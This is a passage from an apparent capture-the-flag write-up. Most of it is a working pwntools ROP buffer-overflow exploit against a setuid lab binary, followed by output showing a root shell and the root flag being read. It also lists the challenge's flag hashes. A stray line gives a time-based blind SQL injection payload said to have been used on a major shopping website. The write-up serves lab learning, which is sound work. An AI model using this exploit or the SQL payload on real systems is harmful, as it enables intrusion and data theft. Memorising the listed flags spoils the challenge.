        p = ssh_session.process('./hacktheworld')
else:
        p = process("./hacktheworld")
        rop = ROP("./hacktheworld")
        gdb.attach(p, '''
                ''')
rop = ROP("./hacktheworld")

def main():
        junk = b"A" * 72
        #call_bash = p64(0x00000000004006bf) # normal bash 
        call_bash = p64(0x00000000004006c4) # root bash 
        null = p64(0x00)
        pop_rdi = p64(rop.find_gadget(["pop rdi", "ret"])[0])

        payload = b"".join(
                [
                        junk,
                        pop_rdi,   ## Pop the first argument into the rdi
                        null,      ## Null value for the root
                        call_bash, ## call bash at the setuid call
                ]
        )

        p.recvuntil(b"Who do you want to hack? ")
        p.sendline(payload)
        p.interactive()


if __name__ == '__main__':
        main()

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 anonymous_bof.py
[+] Connecting to 10.10.164.142 on port 22: Done
[*] magna@10.10.164.142:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process bytearray(b'./hacktheworld') on 10.10.164.142: pid 1464
[*] '/home/witty/Downloads/hacktheworld'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/home/witty/Downloads/hacktheworld'
[*] Switching to interactive mode
# $ id
uid=0(root) gid=1001(magna) groups=1001(magna)
# $ cd /root
# $ ls
flag.txt
# $ cat flag.txt
bc55a426e98deb673beabda50f24ce66

SQL injection in one of the biggest shopping website in the world Payload: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'

```

User 1 Flag

You're going to want to write a Python script for this. 'zA' = 'a'

*9184177ecaa83073cbbf36f1414cc029*

User 2 Flag

*69ee352fb139c9d0699f6f399b63d9d7*

Root Flag

*bc55a426e98deb673beabda50f24ce66*

[[Snapped Phishing Line]]